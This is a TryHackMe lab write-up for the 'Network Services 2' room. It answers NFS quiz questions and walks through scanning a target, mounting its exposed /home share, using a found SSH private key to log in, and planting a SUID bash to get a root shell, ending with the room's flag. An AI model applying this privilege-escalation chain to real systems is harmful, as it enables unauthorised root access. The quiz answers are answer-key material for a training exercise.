---
layout: post
title: Network Services 2 Room Writeup
categories: [TryHackMe]
tags: [Writeup]
---

# TryHackMe: Network Services 2 Room Writeup

> Enumerating and Exploiting More Common Network Services & Misconfigurations

### Task 2

**What does NFS stand for?**

> Network File System

**What process allows an NFS client to 
interact with a remote directory as though it was a physical device?**

> mounting

**What does NFS use to represent files and directories on the server?**

> file handle

**What protocol does NFS use to communicate between the server and client?**

> RPC

**What two pieces of user data does the NFS server take as parameters for 
controlling user permissions? Format: parameter 1 / parameter 2**

> user ID / group ID

**Can a Windows NFS server share files with a Linux client? (Y/N)**

> Y

**Can a Linux NFS server share files with a MacOS client? (Y/N)**

> Y

**What is the latest version of NFS? [released in 2016, but is still up to date as of 2020] This will require external research.**

> 4.2

### Task 3

**Conduct a thorough port scan scan of your choosing, how many ports are open?**

In practice, when you use nmap to scan a huge range of ports, it can take really a long time. So instead of setting up a huge port range, we can divide it into several ranges to make the scanning time short.

```
nmap -A -p1-10000 10.10.186.1
nmap -A -p10001-20000 10.10.186.1
nmap -A -p20001-30000 10.10.186.1
nmap -A -p30001-40000 10.10.186.1
nmap -A -p40001-50000 10.10.186.1
```

> 7

**Which port contains the service we're looking to enumerate?**

> 2049

**Now, use /usr/sbin/showmount -e [IP] to list the NFS shares, what is the name of the visible share?**

```
showmount -e 10.10.186.1
```

> /home

**Change directory to where you mounted the share- what is the name of the folder inside?**

```
mkdir /tmp/mount
mount -t nfs 10.10.186.1:/home /tmp/mount/ -nolock
cd /tmp/mount/
ls
```

> cappucino

**Which of these folders could contain keys that would give us remote access to the server?**

> .ssh

**Which of these keys is most useful to us?**

> id_rsa

**Can we log into the machine using *ssh -i <key-file> <username>@<ip>* ? (Y/N)**

```
cp id_rsa ~
cd ~
chmod 600 id_rsa
ssh -i id_rsa cappucino@10.10.186.1
```

> Y

### Task 4

**Now, we're going to add the SUID bit permission to the bash executable 
we just copied to the share using "sudo chmod +[permission] bash". What 
letter do we use to set the SUID bit set using chmod?**

```
chmod +s bash
```

> s

**Let's do a sanity check, let's check the
 permissions of the "bash" executable using "ls -la bash". What does the
 permission set look like? Make sure that it ends with -sr-x.**

```
chmod +x bash
ls -la bash
```

> rwsr-sr-x

**Now, SSH into the machine as the 
user. List the directory to make sure the bash executable is there. Now,
 the moment of truth. Lets run it with "*./bash -p*". The -p persists the permissions, so that it can run as root with SUID- as otherwise bash will sometimes drop the permissions.**

```
ssh -i id_rsa cappucino@10.10.186.1
./bash -p
```

Now we have entered into a root shell.

> No answer needed

**Great! If all's gone well you should have a shell as root! What's the root flag?**

Change to root home directory, then you can find a text file containing the flag.

```
cd /root
cat root.txt
```

> THM{nfs_got_pwned}
